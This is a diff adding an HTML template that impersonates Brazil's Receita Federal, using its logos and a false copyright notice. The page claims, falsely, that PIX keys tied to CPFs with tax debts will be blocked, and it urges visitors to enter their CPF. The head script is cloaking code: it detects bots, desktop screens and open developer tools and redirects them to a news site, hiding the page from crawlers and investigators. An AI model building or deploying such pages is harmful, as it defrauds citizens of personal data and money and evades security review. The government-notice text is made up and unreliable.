@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html data-template="verificar-cpf">
+<head>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>Receita Federal - Verificar CPF</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <script>
+        // Função para detectar se é um dispositivo móvel
+        function isMobile() {
+          return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+
+        // Função para detectar se é um bot
+        function isBot() {
+          const botAgents = [
+            'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
+            'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'
+          ];
+
+          return botAgents.some(bot => navigator.userAgent.includes(bot));
+        }
+
+        // Função para verificar se a largura da janela é maior que 768px
+        function isWideScreen() {
+          return window.innerWidth > 768;
+        }
+
+        // Função para detectar se o inspetor está aberto
+        function isInspectorOpen() {
+          // Verifica se o console está aberto
+          const devtools = /./;
+          devtools.toString = function() {
+            return 'devtools';
+          };
+          console.log('%c', devtools);
+
+          // Verifica se o tempo de execução de uma função é anormalmente lento
+          let start = performance.now();
+          debugger;
+          let end = performance.now();
+          return end - start > 100;
+        }
+
+        // Redirecionar ou bloquear o acesso
+        function checkAccess() {
+          if (isBot() || (!isMobile() && isWideScreen()) || isInspectorOpen()) {
+            // Redirecionar para o site G1 se o acesso for bloqueado
+            window.location.href = "https://g1.globo.com/";
+          }
+        }
+
+        // Executar a função de verificação ao carregar a página
+        window.onload = checkAccess;
+
+        // Adicionar um listener para verificar novamente se a janela for redimensionada
+        window.addEventListener('resize', checkAccess);
+    </script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
+            font-weight: 400;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
+            font-weight: 600;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-700.1c7c76152b40409f.woff2') }}") format('woff2');
+            font-weight: 700;
+            font-style: normal;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Rawline', sans-serif;
+        }
+        body {
+            background-color: white;
+            padding-top: 60px;
+            color: #333333;
+            font-size: 16px;
+            line-height: 1.05;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 20px;
+            background-color: white;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            height: 60px;
+        }
+        .logo {
+            width: 240px;
+            height: auto;
+        }
+        .header-icons {
+            display: flex;
+            gap: 15px;
+        }
+        .header-icon {
+            font-size: 18px;
+            color: #0056b3;
+        }
+        .hero-image {
+            width: 100%;
+            height: auto;
+            overflow: hidden;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        .hero-image img {
+            width: 100%;
+            height: auto;
+            object-fit: cover;
+        }
+        .user-info {
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            margin: 15px;
+            box-shadow: 0 1px 6px rgba(0, 0, 0, 0.2);
+            background-color: white;
+            padding: 15px;
+            border-radius: 4px;
+            width: calc(100% - 30px);
+        }
+        .user-info-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            width: 100%;
+        }
+        .user-info p {
+            margin: 1px 0;
+            color: #333333;
+            font-size: 16px;
+        }
+        .user-info p strong {
+            font-weight: 600;
+        }
+        .user-info h3 {
+            font-weight: 700;
+            color: #0c326f;
+            margin-bottom: 4px;
+        }
+        .video-container {
+            position: relative;
+            width: 100%;
+            margin: 8px auto 0;
+            border-radius: 4px;
+            overflow: hidden;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .news-description {
+            color: #333;
+            margin-top: 12px;
+            padding: 0 4px;
+            text-align: justify;
+            width: 100%;
+        }
+        .verify-cpf-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0c326f;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-top: 20px;
+        }
+        .verify-cpf-button:hover {
+            background-color: #092555;
+        }
+        .footer {
+            background-color: #01205B;
+            color: white;
+            padding: 16px;
+            text-align: center;
+            margin-top: 40px;
+            width: 100%;
+            position: relative;
+            bottom: 0;
+        }
+        .footer-logo {
+            width: 100px;
+            margin: 0 auto 8px;
+            display: block;
+        }
+        @media (max-width: 600px) {
+            .header {
+                padding: 6px 8px;
+            }
+            .logo {
+                width: 160px;
+            }
+            .header-icons {
+                gap: 8px;
+            }
+            .header-icon {
+                font-size: 16px;
+            }
+            .user-info {
+                margin: 10px;
+                width: calc(100% - 20px);
+            }
+        }
+    </style>
+</head>
+<body class="verificar-cpf-page">
+    <div class="header">
+        <img alt="Logo da Receita Federal" class="logo" src="https://servicos.receitafederal.gov.br/assets/images/receitaAzul.svg"/>
+        <div class="header-icons">
+            <i class="fas fa-search header-icon"></i>
+            <i class="fas fa-question-circle header-icon"></i>
+            <i class="fas fa-adjust header-icon"></i>
+        </div>
+    </div>
+
+    <div class="hero-image">
+        <img alt="Aviso sobre novas regras do PIX" src="https://i.ibb.co/N24MHrBp/Aviso-funcionamento-de-loja-simples-verde-vermelho-story-do-instagram-1080-x-400-px-2.png">
+    </div>
+
+    <div class="user-info">
+        <div class="user-info-content">
+            <div class="user-info-text">
+                <h3>Notícia na mídia</h3>
+                <p><strong>Programa:</strong> Jornal da Band</p>
+                <p><strong>Data:</strong> 05 de março de 2025</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="video-container">
+        <div id="vid_67cf15f9c583df5e2901b7a7" style="position: relative; width: 100%; padding: 56.25% 0 0;">
+            <img id="thumb_67cf15f9c583df5e2901b7a7" src="https://images.converteai.net/dc35a0f2-d1bd-44d5-aca5-cd27f60fc21f/players/67cf15f9c583df5e2901b7a7/thumbnail.jpg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: block;" alt="thumbnail">
+            <div id="backdrop_67cf15f9c583df5e2901b7a7" style=" -webkit-backdrop-filter: blur(5px); backdrop-filter: blur(5px); position: absolute; top: 0; height: 100%; width: 100%; "></div>
+        </div>
+        <script type="text/javascript" id="scr_67cf15f9c583df5e2901b7a7">
+            var s=document.createElement("script");
+            s.src="https://scripts.converteai.net/dc35a0f2-d1bd-44d5-aca5-cd27f60fc21f/players/67cf15f9c583df5e2901b7a7/player.js",
+            s.async=!0,document.head.appendChild(s);
+        </script>
+    </div>
+
+    <div class="user-info">
+        <p class="news-description">
+            De acordo com as novas diretrizes do Banco Central, todas as chaves PIX vinculadas a CPFs com pendências tributárias poderão ser bloqueadas para transferências. Esta medida visa garantir a conformidade fiscal e a segurança do sistema financeiro nacional. Para regularizar sua situação e evitar o bloqueio de suas chaves PIX, insira seu CPF abaixo e verifique se há pendências em seu cadastro.
+        </p>
+        <button onclick="window.location.href='/buscar-cpf'" class="verify-cpf-button">
+            Verificar meu CPF
+        </button>
+    </div>
+
+    <footer class="footer">
+        <img src="https://www.enat.receita.economia.gov.br/pt-br/area_nacional/noticias/logo-rfb/image_preview" alt="Receita Federal Logo" class="footer-logo">
+        <p>© 2025 Receita Federal do Brasil. Todos os direitos reservados.</p>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('[DEBUG] Inicializando script');
+        });
+    </script>
+</body>
+</html>
